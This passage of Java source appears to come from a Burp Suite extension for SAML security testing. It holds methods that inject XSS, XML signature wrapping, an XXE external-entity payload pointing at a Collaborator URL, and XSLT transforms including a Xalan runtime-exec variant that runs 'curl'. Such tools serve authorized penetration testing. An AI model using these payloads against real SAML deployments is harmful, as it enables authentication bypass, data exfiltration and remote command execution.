            // Not stale — signature verifies under attacker key per design.
            clearSignatureStaleness();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void importMetadata(String metadataXml) {
        try {
            var entries = helpers.MetadataImport.extract(metadataXml);
            if (entries.isEmpty()) {
                setInfoMessageText("Metadata contained no <ds:X509Certificate> entries.");
                return;
            }
            // Deduplicate by cert bytes — metadata often lists the same cert
            // under both "signing" and "encryption" KeyDescriptors.
            var seen = new java.util.LinkedHashSet<String>();
            int imported = 0;
            for (var entry : entries) {
                if (!seen.add(entry.base64Der())) continue;
                var cert = certificateTabController.importCertificateFromString(entry.base64Der());
                if (cert != null) imported++;
            }
            setInfoMessageText("Imported " + imported + " certificate(s) from metadata");
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyResponseXSS(ResponseXSS.Target target, String payload) {
        try {
            samlMessage = ResponseXSS.apply(textArea.getText(), target, payload);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText("XSS payload injected into " + target.name());
            markSignatureStale();
        } catch (Exception e) {
            setInfoMessageText(e.getMessage());
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyXSW() {
        Document document;
        try {
            document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getText());
            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
            samlMessage = xmlHelpers.getStringOfDocument(document);
            textArea.setText(prettifyXmlOrFallback(samlMessage));
            isEdited = true;
            setInfoMessageText(XSW_ATTACK_APPLIED);
            markSignatureStale();
        } catch (SAXException e) {
            setInfoMessageText(XML_NOT_WELL_FORMED);
        } catch (IOException e) {
            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
        } catch (DOMException | NullPointerException e) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
        }
    }

    public void applyXXE(String collabUrl) {
        String current = textArea.getText();
        String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
        String[] splitMsg = current.split("\\?>");
        if (splitMsg.length == 2) {
            samlMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
        } else {
            String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
            samlMessage = xmlDeclaration + xxePayload + current;
        }
        textArea.setText(prettifyXmlOrFallback(samlMessage));
        isEdited = true;
        setInfoMessageText(XXE_CONTENT_APPLIED);
        markSignatureStale();
    }

    public void applyXSLT(XSLTPayloads.Flavor flavor, String param) {
        String current = textArea.getText();
        var prefixed = true;
        var transformString = "<ds:Transforms>";

        int index = current.indexOf(transformString);
        if (index == -1) {
            prefixed = false;
            transformString = "<Transforms>";
        }

        index = current.indexOf(transformString);
        if (index == -1) {
            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSLT);
            return;
        }

        var prefix = prefixed ? "ds:" : "";
        String xslt;
        String statusSuffix;
        if (flavor == XSLTPayloads.Flavor.ALL) {
            xslt = xsltTransform(prefix, XSLTPayloads.Flavor.SAXON_UNPARSED_TEXT, param)
                 + xsltTransform(prefix, XSLTPayloads.Flavor.XALAN_RUNTIME_EXEC, "curl " + param)
                 + xsltTransform(prefix, XSLTPayloads.Flavor.XALAN_CLASS_INSTANTIATION, param);
            statusSuffix = " (all 3 flavors)";
        } else {
            xslt = xsltTransform(prefix, flavor, param);
            statusSuffix = " (" + flavor.name() + ")";
        }

        int substringIndex = index + transformString.length();
        String firstPart = current.substring(0, substringIndex);
        String secondPart = current.substring(substringIndex);
        samlMessage = firstPart + xslt + secondPart;
        textArea.setText(prettifyXmlOrFallback(samlMessage));
        isEdited = true;
        setInfoMessageText(XSLT_CONTENT_APPLIED + statusSuffix);
        markSignatureStale();
    }

    private static String xsltTransform(String prefix, XSLTPayloads.Flavor flavor, String param) {
        return "\n<%sTransform>\n%s\n</%sTransform>\n".formatted(
                prefix, XSLTPayloads.stylesheetFor(flavor, param), prefix);
    }

    public synchronized void addMatchAndReplace(String match, String replace) {
        XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
    }

    public synchronized HashMap<String, String> getMatchAndReplaceMap() {
        return XSWHelpers.MATCH_AND_REPLACE_MAP;
    }

    public void setGUIEditable(boolean editable) {
        if (editable) {
            samlGUI.getActionPanel().enableControls();
        } else {
            samlGUI.getActionPanel().disableControls();
        }
    }

    public void showCVEHelp() {
        var cve = samlGUI.getActionPanel().getSelectedCVE();
        var window = new CVEHelpWindow(cve);
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    public void showSignatureHelp() {
        var window = new SignatureHelpWindow();
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    public void showXSWHelp() {
        XSWHelpWindow window = new XSWHelpWindow();
        window.setLocationRelativeTo(BurpExtender.api.userInterface().swingUtils().suiteFrame());
        window.setVisible(true);
    }

    @Override
    public void update() {
        updateCertificateList();
    }

    public String getEditorContents() {
        return this.textArea.getText();
    }

    public void setEditorContents(String text) {
        this.isEdited = true;
        this.textArea.setText(prettifyXmlOrFallback(text));
    }

    // Called after any attack or manual edit that leaves the document content
    // out of sync with its embedded signature(s).
    private void markSignatureStale() {
        if (hadSignature && !signatureIsStale) {
            signatureIsStale = true;
            samlGUI.getActionPanel().setSignatureStatus(true);
        }
    }

    // Called after re-sign, reset, or signature removal — signature is no longer stale.
    private void clearSignatureStaleness() {
        if (signatureIsStale) {
            signatureIsStale = false;
            samlGUI.getActionPanel().setSignatureStatus(false);
        }
    }
}
